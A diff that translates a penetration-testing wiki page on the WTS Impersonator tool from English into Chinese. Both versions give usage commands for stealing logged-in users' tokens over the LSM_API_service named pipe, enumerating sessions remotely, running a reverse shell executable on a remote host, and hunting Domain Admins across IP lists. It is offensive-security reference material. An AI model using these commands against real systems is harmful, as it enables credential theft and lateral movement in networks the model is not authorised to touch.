@@ -1,51 +1,48 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-The **WTS Impersonator** tool exploits the **"\\pipe\LSM_API_service"** RPC Named pipe to stealthily enumerate logged-in users and hijack their tokens, bypassing traditional Token Impersonation techniques. This approach facilitates seamless lateral movements within networks. The innovation behind this technique is credited to **Omri Baso, whose work is accessible on [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
+**WTS Impersonator** 工具利用 **"\\pipe\LSM_API_service"** RPC 命名管道，悄无声息地枚举已登录用户并劫持他们的令牌，绕过传统的令牌模拟技术。这种方法促进了网络内的无缝横向移动。这项技术的创新归功于 **Omri Baso，他的工作可以在 [GitHub](https://github.com/OmriBaso/WTSImpersonator) 上找到**。
 
-### Core Functionality
+### 核心功能
 
-The tool operates through a sequence of API calls:
-
+该工具通过一系列 API 调用进行操作：
 ```powershell
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
+### 关键模块和用法
 
-### Key Modules and Usage
+- **枚举用户**：使用该工具可以进行本地和远程用户枚举，使用适用于两种情况的命令：
 
-- **Enumerating Users**: Local and remote user enumeration is possible with the tool, using commands for either scenario:
+- 本地：
+```powershell
+.\WTSImpersonator.exe -m enum
+```
+- 远程，通过指定IP地址或主机名：
+```powershell
+.\WTSImpersonator.exe -m enum -s 192.168.40.131
+```
 
-  - Locally:
-    ```powershell
-    .\WTSImpersonator.exe -m enum
-    ```
-  - Remotely, by specifying an IP address or hostname:
-    ```powershell
-    .\WTSImpersonator.exe -m enum -s 192.168.40.131
-    ```
+- **执行命令**：`exec`和`exec-remote`模块需要**服务**上下文才能工作。本地执行只需WTSImpersonator可执行文件和一个命令：
 
-- **Executing Commands**: The `exec` and `exec-remote` modules require a **Service** context to function. Local execution simply needs the WTSImpersonator executable and a command:
+- 本地命令执行示例：
+```powershell
+.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
+```
+- PsExec64.exe可用于获取服务上下文：
+```powershell
+.\PsExec64.exe -accepteula -s cmd.exe
+```
 
-  - Example for local command execution:
-    ```powershell
-    .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
-    ```
-  - PsExec64.exe can be used to gain a service context:
-    ```powershell
-    .\PsExec64.exe -accepteula -s cmd.exe
-    ```
+- **远程命令执行**：涉及创建和安装一个远程服务，类似于PsExec.exe，允许以适当的权限执行。
 
-- **Remote Command Execution**: Involves creating and installing a service remotely similar to PsExec.exe, allowing execution with appropriate permissions.
+- 远程执行示例：
+```powershell
+.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
+```
 
-  - Example of remote execution:
-    ```powershell
-    .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
-    ```
-
-- **User Hunting Module**: Targets specific users across multiple machines, executing code under their credentials. This is especially useful for targeting Domain Admins with local admin rights on several systems.
-  - Usage example:
-    ```powershell
-    .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
-    ```
+- **用户猎杀模块**：针对多个机器上的特定用户，在他们的凭据下执行代码。这对于针对在多个系统上具有本地管理员权限的域管理员特别有用。
+- 用法示例：
+```powershell
+.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
+```
 
 {{#include ../../banners/hacktricks-training.md}}
-
